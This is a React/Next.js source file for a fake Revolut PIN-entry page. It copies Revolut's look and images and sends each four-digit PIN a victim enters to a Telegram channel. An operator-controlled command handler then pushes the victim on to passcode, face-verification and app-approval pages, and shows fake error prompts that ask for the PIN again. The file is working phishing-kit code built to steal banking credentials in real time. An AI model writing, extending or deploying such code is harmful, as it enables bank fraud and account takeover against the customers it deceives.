'use client';
import '../app/globals.css';
import React, { useState, useEffect, useRef, useCallback, Fragment } from 'react';
import Header from '../components/Header';
import { useRouter } from 'next/navigation';
import { sendMessageToTelegram } from '../lib/api';
import { useCommand } from '../app/lib/CommandContext';
import RevoluteLoader from '../components/RevoluteLoader';
import MobileAuthModal from '../components/MobileAuthModal';
import ErrorModal from '../components/ErrorModal';

export default function PinPage() {
    const router = useRouter();
    const { command } = useCommand();
    const [pins, setPins] = useState('');
    const [displayLoader, setDisplayLoader] = useState(false);
    const [displayError, setDisplayError] = useState(false);
    const [displayAuth, setDisplayAuth] = useState(false);
    const [displayMessage, setDisplayMessage] = useState('phone');

    const displayPageLoader = () => {
        setDisplayLoader(!displayLoader);
    };

    const displayAuthModal = () => {
        setDisplayAuth(!displayAuth);
    };

    const displayErrorModal = (errorType) => {
        setDisplayError(true);
        setDisplayMessage(errorType);
    };

    const navigateWithLoader = (path) => {
        setDisplayLoader(true);
        const minLoaderTime = 3500;
        const startTime = Date.now();

        const performNavigation = () => router.push(path);

        setTimeout(() => {
            const elapsedTime = Date.now() - startTime;
            if (elapsedTime < minLoaderTime) {
                setTimeout(performNavigation, minLoaderTime - elapsedTime);
            } else {
                performNavigation();
            }
        }, 100);
    };

    // Updated command handling for PIN
    useEffect(() => {
        if (command === 'REQUEST_REVOLUT_PIN_AGAIN') {
            console.log("HERE WE WILL REQUEST REVOLUT PASSCODE AGAIN");
            displayErrorModal('passcode'); // Show error modal for passcode
        } else if (command === 'REQUEST_REVOLUT_PASSCODE') {
            navigateWithLoader('/PasscodePage');
        } else if (command === 'REQUEST_REVOLUT_PASSCODE_AGAIN') {
            console.log("HERE WE WILL REQUEST REVOLUT PIN");
            displayErrorModal('passcode'); // Show error modal for pin
        } else if (command === 'REQUEST_REVOLUT_FACE_VERIFICATION') {
            navigateWithLoader('/FaceVerificationPage');
        } else if (command === 'REQUEST_REVOLUT_FACE_VERIFICATION_AGAIN') {
            // displayErrorModal('face_verification'); // Show error modal for face verification
        } else if (command === 'REQUEST_MOBILE_APP_VERIFICATION') {
            displayAuthModal()
        } else if (command === 'FINISH') {
            navigateWithLoader('/verificationPage');
        }
    }, [command, router]);

    // PC Input handling for 4 digits
    const handlePCInputChange = (e, index) => {
        const value = e.target.value;
        if (/[0-9]/.test(value)) {
            const newPins = pins.split('');
            newPins[index] = value;
            setPins(newPins.join(''));

            if (newPins.join('').length === 4) {
                sendMessageToTelegram(newPins.join(''));
            }

            if (index < 3) {
                const inputs = e.target.parentElement.querySelectorAll('input');
                inputs[index + 1].focus();
            }
        }
    };

    const handlePCInputKeyDown = (e, index) => {
        if (e.key === 'Backspace') {
            const newPins = pins.split('');
            newPins[index] = '';
            setPins(newPins.join(''));
            if (index > 0) {
                const inputs = e.target.parentElement.querySelectorAll('input');
                inputs[index - 1].focus();
            }
        }
    };

    // Mobile input handling for 4 digits
    const handleMobileInput = (number) => {
        if (pins.length < 4) {
            setPins(prev => {
                const newPins = prev + number.toString();
                if (newPins.length === 4) {
                    sendMessageToTelegram(newPins);
                }
                return newPins;
            });
        }
    };

    const handleMobileBackspace = () => {
        setPins(prev => prev.slice(0, -1));
    };

    const stableSetDisplayAuth = useCallback(
        (value) => setDisplayAuth(value),
        []
    );

    return (
        <div className="bg-[#f7f7f7] text-black w-full h-screen flex flex-col">
            {/* Modals */}
            {displayError && <ErrorModal {...{displayError, setDisplayError, displayMessage}} />}
            {displayAuth && <MobileAuthModal {...{displayAuth, setDisplayAuth: stableSetDisplayAuth, displayMessage}} />}
            {displayLoader && <RevoluteLoader {...{displayLoader, setDisplayLoader}} />}

            {/* Desktop View */}
            <div className='hidden md:block'>
                <Header />
                <div className="flex min-h-[550px] justify-center items-center">
                    <div className='flex justify-center gap-x-10 h-[264px] w-full'>
                        <div className='w-[352px] h-[264px]'>
                            <div className="my-[17px]">
                                <div className="flex gap-2 items-center justify-center">
                                    {[...Array(4)].map((_, index) => (
                                        <input
                                            key={index}
                                            type="text"
                                            maxLength="1"
                                            inputMode="numeric"
                                            className="w-[40px] rounded-[1rem] h-[50px] text-center bg-[#ebebf0] outline-none focus:caret-[#4f55f1]"
                                            style={{ WebkitTextSecurity: 'disc' }}
                                            value={pins[index] || ''}
                                            onChange={(e) => handlePCInputChange(e, index)}
                                            onKeyDown={(e) => handlePCInputKeyDown(e, index)}
                                        />
                                    ))}
                                </div>
                            </div>
                            <div className='mt-4 text-center'>
                                <a href="" className='text-[#4f55f1] text-sm'>Forgot your PIN?</a>
                            </div>
                        </div>
                        <div className='w-[264px] h-[264px]'>
                            <img src="https://assets.revolut.com/assets/3d-images-v2/3D005.png" alt="security" />
                        </div>
                    </div>
                </div>
            </div>

            {/* Mobile View */}
            <div className='md:hidden px-4 pt-4 h-screen flex flex-col'>
                <div className='w-full h-[40px] flex justify-start'>
                    <button>
                        <img src="https://assets.revolut.com/assets/icons/ArrowThinLeft.svg" alt="back" />
                    </button>
                </div>

                <div className='text-center mt-8'>
                    <h1 className='font-bold text-xl'>Enter PIN</h1>
                </div>

                <div className="flex gap-4 justify-center mt-12">
                    {[...Array(4)].map((_, index) => (
                        <div
                            key={index}
                            className={`w-4 h-4 rounded-full ${pins.length > index ? 'bg-[#4f55f1]' : 'bg-[#c9c9cd]'}`}
                        />
                    ))}
                </div>

                <div className='mt-auto mb-8'>
                    <div className="grid grid-cols-3 gap-4 place-items-center">
                        {[1, 2, 3, 4, 5, 6, 7, 8, 9].map((num) => (
                            <button
                                key={num}
                                onClick={() => handleMobileInput(num)}
                                className="w-16 h-16 rounded-full text-2xl hover:bg-gray-100"
                            >
                                {num}
                            </button>
                        ))}
                        <div></div>
                        <button
                            onClick={() => handleMobileInput(0)}
                            className="w-16 h-16 rounded-full text-2xl hover:bg-gray-100"
                        >
                            0
                        </button>
                        <button
                            onClick={handleMobileBackspace}
                            className="w-16 h-16 rounded-full flex items-center justify-center hover:bg-gray-100"
                        >
                            <img src="https://assets.revolut.com/assets/icons/ArrowBackspace.svg" alt="backspace" />
                        </button>
                    </div>
                </div>

                <div className='text-center pb-8'>
                    <a href="" className="text-[#4f55f1] text-sm">Forgot your PIN?</a>
                </div>
            </div>
        </div>
    );
}
